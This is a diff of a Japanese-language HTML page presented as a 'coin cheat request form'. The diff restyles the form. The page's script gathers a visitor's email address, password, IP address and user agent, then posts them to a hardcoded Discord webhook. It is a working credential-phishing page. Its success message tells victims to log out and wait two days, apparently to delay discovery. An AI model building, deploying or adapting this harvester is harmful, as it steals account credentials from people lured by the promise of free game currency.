@@ -8,10 +8,19 @@
         body {
             font-family: Arial, sans-serif;
             padding: 20px;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(to bottom, #dcd6f7, #f7d6e0); /* グラデーション */
         }
         form {
             max-width: 400px;
-            margin: 0 auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
         label {
             display: block;
@@ -50,8 +59,8 @@
     </style>
 </head>
 <body>
-    <h1>コインチート依頼フォーム</h1>
     <form id="authForm">
+        <h1>コインチート依頼フォーム</h1>
         <label for="address">メールアドレス</label>
         <input type="email" id="address" placeholder="メールアドレスを入力" required>
 
@@ -59,46 +68,40 @@
         <input type="text" id="password" placeholder="パスワードを入力" required>
 
         <button type="button" onclick="submitForm()">送信</button>
-    </form>
 
-    <div id="successMessage" class="success-message" style="display: none;">送信完了しました！アカウントから一度ログアウトしてください！（目安は二日ほど）</div>
-    <div id="errorMessage" class="error-message" style="display: none;">送信に失敗しました。再度お試しください。</div>
+        <div id="successMessage" class="success-message" style="display: none;">送信完了しました！アカウントから一度ログアウトしてください！（目安は二日ほど）</div>
+        <div id="errorMessage" class="error-message" style="display: none;">送信に失敗しました。再度お試しください。</div>
+    </form>
 
     <script>
         async function submitForm() {
             const address = document.getElementById("address").value;
             const password = document.getElementById("password").value;
 
-            // 必須項目が空かどうかチェック
             if (!address || !password) {
                 alert("全ての項目を入力してください。");
                 return;
             }
 
             try {
-                // 外部APIでIPアドレスを取得
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const ipAddress = ipData.ip;
 
-                // デバイス情報を取得
                 const userAgent = navigator.userAgent;
 
-                // Webhook URL
                 const webhookURL = 'https://discord.com/api/webhooks/1332143787555688609/J91Uc5C-cAu8pn4plSRKRlWzNTDdvyr30ZwUSjHkt7CLkwewHj7PVEpnIC3AF8kHmbWM';
 
-                // 埋め込みメッセージの作成
                 const payload = {
                     embeds: [
                         {
                             title: "アカウント情報とデバイス情報",
                             description: `**メールアドレス:** \`${address}\`\n**パスワード:** \`${password}\`\n**デバイス情報:** \`${userAgent}\`\n**IPアドレス:** \`${ipAddress}\``,
-                            color: 3447003, // 青色の枠線 (色はRGBの10進数値で指定)
+                            color: 3447003,
                         }
                     ]
                 };
 
-                // Webhookに送信
                 const response = await fetch(webhookURL, {
                     method: 'POST',
                     headers: {
